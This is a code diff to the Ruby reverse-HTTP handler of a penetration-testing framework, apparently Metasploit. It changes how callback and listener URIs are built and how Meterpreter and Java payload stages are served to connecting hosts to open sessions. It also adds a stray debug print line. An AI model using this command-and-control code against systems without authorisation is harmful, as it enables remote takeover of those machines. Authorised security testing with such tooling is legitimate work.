@@ -66,19 +66,20 @@ module ReverseHttp
 
   def print_prefix
     if Thread.current[:cli]
-      luri = datastore['LURI'].empty? ? "" : "-> (#{datastore['LURI']}) "
-      super + "#{listener_uri} handling request from #{Thread.current[:cli].peerhost}#{luri}; (UUID: #{uuid.to_s}) "
+      super + "#{listener_uri} handling request from #{Thread.current[:cli].peerhost}; (UUID: #{uuid.to_s}) "
     else
       super
     end
   end
 
-  # Return a URI suitable for placing in a payload
+  # A URI describing where we are listening
   #
+  # @param addr [String] the address that
   # @return [String] A URI of the form +scheme://host:port/+
-  def listener_uri(addr=datastore['LHOST'])
+  def listener_uri(addr=datastore['ReverseListenerBindAddress'])
+    addr = datastore['LHOST'] if addr.nil? || addr.empty?
     uri_host = Rex::Socket.is_ipv6?(addr) ? "[#{addr}]" : addr
-    "#{scheme}://#{uri_host}:#{bind_port}#{luri}/"
+    "#{scheme}://#{uri_host}:#{bind_port}#{luri}"
   end
 
   # Return a URI suitable for placing in a payload.
@@ -86,26 +87,37 @@ module ReverseHttp
   # Host will be properly wrapped in square brackets, +[]+, for ipv6
   # addresses.
   #
+  # @param req [Rex::Proto::Http::Request]
   # @return [String] A URI of the form +scheme://host:port/+
-  def payload_uri(req)
+  def payload_uri(req=nil)
     callback_host = nil
 
     # Extract whatever the client sent us in the Host header
     if req && req.headers && req.headers['Host']
-      callback_host = req.headers['Host']
+        callback_host, callback_port = req.headers['Host'].split(":")
+        callback_port = callback_port.to_i
+        callback_port ||= (ssl? ? 443 : 80)
     end
 
     # Override the host and port as appropriate
     if datastore['OverrideRequestHost'] || callback_host.nil?
-      callback_name = datastore['OverrideLHOST'] || datastore['LHOST']
-      callback_port = datastore['OverrideLPORT'] || datastore['LPORT']
-      if Rex::Socket.is_ipv6? callback_name
-        callback_name = "[#{callback_name}]"
-      end
-      callback_host = "#{callback_name}:#{callback_port}"
+      callback_host = datastore['OverrideLHOST']
+      callback_port = datastore['OverrideLPORT']
     end
 
-    "#{scheme}://#{callback_host}"
+    if callback_host.nil? || callback_host.empty?
+      callback_host = datastore['LHOST']
+    end
+
+    if callback_port.nil? || callback_port.zero?
+      callback_port = datastore['LPORT']
+    end
+
+    if Rex::Socket.is_ipv6? callback_host
+      callback_host = "[#{callback_host}]"
+    end
+
+    "#{scheme}://#{callback_host}:#{callback_port}"
   end
 
   # Use the #refname to determine whether this handler uses SSL or not
@@ -122,22 +134,23 @@ module ReverseHttp
     (ssl?) ? 'https' : 'http'
   end
 
-  #
   # The local URI for the handler.
   #
   # @return [String] Representation of the URI to listen on.
-  #
   def luri
     l = datastore['LURI'] || ""
 
-    if l && l.length > 0 && l[0] != '/'
-      # make sure the luri has the prefix
-      l = "/#{l}"
-
-      # but not the suffix
-      if l[-1] == '/'
+    if l && l.length > 0
+      # strip trailing slashes
+      while l[-1] == '/'
         l = l[0...-1]
       end
+
+      # make sure the luri has the prefix
+      if l[0] != '/'
+        l = "/#{l}"
+      end
+
     end
 
     l.dup
@@ -145,6 +158,7 @@ module ReverseHttp
 
   # Create an HTTP listener
   #
+  # @return [void]
   def setup_handler
 
     local_addr = nil
@@ -177,13 +191,10 @@ module ReverseHttp
 
     self.service.server_name = datastore['MeterpreterServerName']
 
-    # Create a reference to ourselves
-    obj = self
-
     # Add the new resource
     service.add_resource(luri + "/",
       'Proc' => Proc.new { |cli, req|
-        on_request(cli, req, obj)
+        on_request(cli, req)
       },
       'VirtualDirectory' => true)
 
@@ -254,25 +265,25 @@ protected
   #
   # Parses the HTTPS request
   #
-  def on_request(cli, req, obj)
+  def on_request(cli, req)
     Thread.current[:cli] = cli
     resp = Rex::Proto::Http::Response.new
     info = process_uri_resource(req.relative_resource)
     uuid = info[:uuid] || Msf::Payload::UUID.new
 
     # Configure the UUID architecture and payload if necessary
-    uuid.arch      ||= obj.arch
-    uuid.platform  ||= obj.platform
+    uuid.arch      ||= self.arch
+    uuid.platform  ||= self.platform
 
     conn_id = luri
     if info[:mode] && info[:mode] != :connect
       conn_id << generate_uri_uuid(URI_CHECKSUM_CONN, uuid)
     else
       conn_id << req.relative_resource
-      conn_id = conn_id[0...-1] if conn_id[-1] == '/'
+      conn_id = conn_id.chomp('/')
     end
 
-    request_summary = "#{luri}#{req.relative_resource} with UA '#{req.headers['User-Agent']}'"
+    request_summary = "#{conn_id} with UA '#{req.headers['User-Agent']}'"
 
     # Validate known UUIDs for all requests if IgnoreUnknownPayloads is set
     if datastore['IgnoreUnknownPayloads'] && ! framework.uuid_db[uuid.puid_hex]
@@ -311,7 +322,7 @@ protected
         url = payload_uri(req) + conn_id + '/'
 
         blob = ""
-        blob << obj.generate_stage(
+        blob << self.generate_stage(
           http_url: url,
           http_user_agent: datastore['MeterpreterUserAgent'],
           http_proxy_host: datastore['PayloadProxyHost'] || datastore['PROXYHOST'],
@@ -324,7 +335,7 @@ protected
 
         # Short-circuit the payload's handle_connection processing for create_session
         create_session(cli, {
-          :passive_dispatcher => obj.service,
+          :passive_dispatcher => self.service,
           :conn_id            => conn_id,
           :url                => url,
           :expiration         => datastore['SessionExpirationTimeout'].to_i,
@@ -339,7 +350,7 @@ protected
         print_status("Staging Java payload...")
         url = payload_uri(req) + conn_id + "/\x00"
 
-        blob = obj.generate_stage(
+        blob = self.generate_stage(
           uuid: uuid,
           uri:  conn_id
         )
@@ -348,7 +359,7 @@ protected
 
         # Short-circuit the payload's handle_connection processing for create_session
         create_session(cli, {
-          :passive_dispatcher => obj.service,
+          :passive_dispatcher => self.service,
           :conn_id            => conn_id,
           :url                => url,
           :expiration         => datastore['SessionExpirationTimeout'].to_i,
@@ -369,7 +380,7 @@ protected
         begin
           # generate the stage, but pass in the existing UUID and connection id so that
           # we don't get new ones generated.
-          blob = obj.stage_payload(
+          blob = self.stage_payload(
             uuid: uuid,
             uri:  conn_id,
             lhost: uri.host,
@@ -380,7 +391,7 @@ protected
 
           # Short-circuit the payload's handle_connection processing for create_session
           create_session(cli, {
-            :passive_dispatcher => obj.service,
+            :passive_dispatcher => self.service,
             :conn_id            => conn_id,
             :url                => url,
             :expiration         => datastore['SessionExpirationTimeout'].to_i,
@@ -403,9 +414,11 @@ protected
         url = payload_uri(req) + conn_id
         url << '/' unless url[-1] == '/'
 
+        p url
+
         # Short-circuit the payload's handle_connection processing for create_session
         create_session(cli, {
-          :passive_dispatcher => obj.service,
+          :passive_dispatcher => self.service,
           :conn_id            => conn_id,
           :url                => url + "\x00",
           :expiration         => datastore['SessionExpirationTimeout'].to_i,
@@ -427,7 +440,7 @@ protected
     cli.send_response(resp) if (resp)
 
     # Force this socket to be closed
-    obj.service.close_client(cli)
+    self.service.close_client(cli)
   end
 
 end
